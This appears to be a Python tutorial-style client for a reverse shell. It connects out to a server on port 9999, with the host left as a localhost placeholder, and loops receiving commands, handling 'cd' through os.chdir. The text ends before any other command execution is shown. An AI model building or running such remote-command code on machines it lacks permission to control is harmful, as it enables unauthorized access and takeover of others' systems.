import socket
# os and subprocess libraries needed as they are required to execute instructions received by client machine
import os
import subprocess

s = socket.socket()
host = "for now, since we don't have our live server setup yet, for testing purposes can use IP address of local host"
port = 9999

s.connect((host,port))

# same concept as for server, infinite while loop to run concurrently
while True:
    # receiveing data (command/message) with a buffer size of 1024 bits
    data = s.recv(1024)

    # now need to do data checks to on the file to make sure it is formatted properly in cmd
    # first check is checking for the 'cd' command to change directory
    # basically checking to see if the first two characters of the decoded message is 'cd' or not
    if data[:2].decode("utf-8") == 'cd':
        # now taking parsing pas the 3rd character of decoded message to obtain the path
        # this path is then went into using the chdir function as part of the os library
        os.chdir(data[3:].decode("utf-8"))